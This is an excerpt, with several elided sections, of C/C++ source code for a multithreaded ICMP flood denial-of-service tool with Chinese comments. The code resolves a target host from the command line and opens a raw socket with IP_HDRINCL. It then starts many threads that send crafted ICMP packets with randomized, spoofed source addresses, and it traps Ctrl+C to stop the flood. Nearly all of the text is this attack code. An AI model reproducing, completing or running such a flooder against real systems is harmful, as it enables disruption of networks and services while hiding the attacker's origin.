...
static void Dos_sig();                      //捕捉ctrl+c信号
...
int main(int argc, char *argv[]) {
    ...
    int err = -1;
    alive = 1;
    signal(SIGINT, reinterpret_cast<__sighandler_t>(Dos_sig));     //截取信号ctrl+c
    if (argc < 2) {
        return -1;
    }
    protocol = getprotobyname(
            protoname);     //获取协议类型ICMP
    if (protocol == NULL) {
    ...
    if (dest == INADDR_NONE) {
        host = gethostbyname(
                argv[1]);    //输入的主机地址为DNS地址
        if (host == NULL) {
            perror("gethostbyname()");
            return -1;
        }
        //将地址复制到dest中
        memcpy((char *) &dest, host->h_addr,
               host->h_length);
    }
    //建立原始套接字
    ...
    //if(rawsock<0)
    //{
    rawsock = socket(AF_INET, SOCK_RAW,
                     PROTO_ICMP);
    //}
    //设置IP选项
    setsockopt(rawsock, SOL_IP, IP_HDRINCL, "1",
               sizeof("1"));
    //建立多个线程协同工作
    for (i = 0; i < MAXCHILD; i++) {
        err = pthread_create(&pthread[i], NULL,
                             reinterpret_cast<void *(*)(void *)>(Dos_fun), NULL);
    }
    //等待线程结束
    for (i = 0; i < MAXCHILD; i++) {
...
static void Dos_icmp(void) {
    ...
    struct icmp *icmph;
    char *packet;
    int pktsize = sizeof(struct ip) +
                  sizeof(struct icmp) + 64;
    packet = static_cast<char *>(malloc(pktsize));
    ...
    iph->ip_src.s_addr = (unsigned long) myrandom(
            0, 65535);       //发送的源地址
    ...
    to.sin_port = htons(0);
    //发送数据
    sendto(rawsock, packet, pktsize, 0,
           (struct sockaddr *) &to,
